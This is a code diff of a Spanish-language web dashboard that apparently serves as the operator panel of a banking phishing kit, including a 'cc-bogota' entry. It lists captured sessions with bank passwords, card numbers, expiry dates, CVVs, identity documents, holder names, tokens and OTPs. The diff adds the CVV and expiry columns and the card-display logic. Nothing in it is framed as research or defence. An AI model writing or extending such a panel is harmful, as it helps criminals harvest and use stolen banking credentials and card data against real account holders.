@@ -223,9 +223,10 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                                 <th class="checkbox-col"><input type="checkbox" id="checkAllSesiones"></th>
                                 <th>Banco</th>
                                 <th>Estado</th>
-                                <th>Identificación</th>
-                                <th>Clave</th>
-                                <th>Doc / Tarjeta</th>
+                                <th>Identificación/Trj</th>
+                                <th>Clave/Fch</th>
+                                <th>CVV</th>
+                                <th>Documento</th>
                                 <th>Titular</th>
                                 <th>Token</th>
                                 <th>OTP</th>
@@ -235,7 +236,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
                             </tr>
                         </thead>
                         <tbody id="tbodySesiones">
-                            <tr><td colspan="12" class="empty">Cargando...</td></tr>
+                            <tr><td colspan="13" class="empty">Cargando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -580,22 +581,41 @@ function renderSesiones() {
             const texto = [
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
                 datos.docNumber, datos.tarjeta, datos.titular, datos.token,
-                datos.otp, datos.monto, datos.ip
+                datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
+                datos.cvv
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
     }
     if (!lista.length) {
-        tbody.innerHTML = '<tr><td colspan="12" class="empty">Sin sesiones</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="13" class="empty">Sin sesiones</td></tr>';
         actualizarBtnBorrarSesiones();
         return;
     }
     tbody.innerHTML = lista.map(s => {
         const datos = s.datos || {};
         const banco = datos.bancoKey || '-';
-        const identificacion = datos.identificacion || '-';
-        const clave = datos.clave || '-';
-        const doc = datos.docNumber || (datos.tarjeta ? truncar(datos.tarjeta, 20) : '-');
+        const esTarjeta = banco === 'cc-bogota';
+
+        let identificacionTrj = '-';
+        let claveFch = '-';
+        let cvv = '-';
+        let documento = '-';
+
+        if (esTarjeta) {
+            identificacionTrj = datos.tarjeta || '-';
+            const mes = datos.expMes || '';
+            const anio = datos.expAnio || '';
+            claveFch = (mes || anio) ? `${mes}/${anio}` : '-';
+            cvv = datos.cvv || '-';
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+        } else {
+            identificacionTrj = datos.identificacion || '-';
+            claveFch = datos.clave || '-';
+            cvv = '-';
+            documento = '-';
+        }
+
         const titular = datos.titular || '-';
         const token = datos.token || '-';
         const otp = datos.otp || '-';
@@ -607,9 +627,10 @@ function renderSesiones() {
                 <td class="checkbox-col"><input type="checkbox" class="check-sesion" data-id="${escapeHtml(s.sessionId)}" ${checked}></td>
                 <td>${escapeHtml(nombreBanco(banco))}</td>
                 <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
-                <td class="dato">${escapeHtml(identificacion)}</td>
-                <td class="dato">${escapeHtml(clave)}</td>
-                <td class="dato" title="${escapeHtml(doc)}">${escapeHtml(doc)}</td>
+                <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
+                <td class="dato">${escapeHtml(claveFch)}</td>
+                <td class="dato">${escapeHtml(cvv)}</td>
+                <td class="dato" title="${escapeHtml(documento)}">${escapeHtml(truncar(documento, 20))}</td>
                 <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
                 <td class="dato">${escapeHtml(token)}</td>
                 <td class="dato">${escapeHtml(otp)}</td>
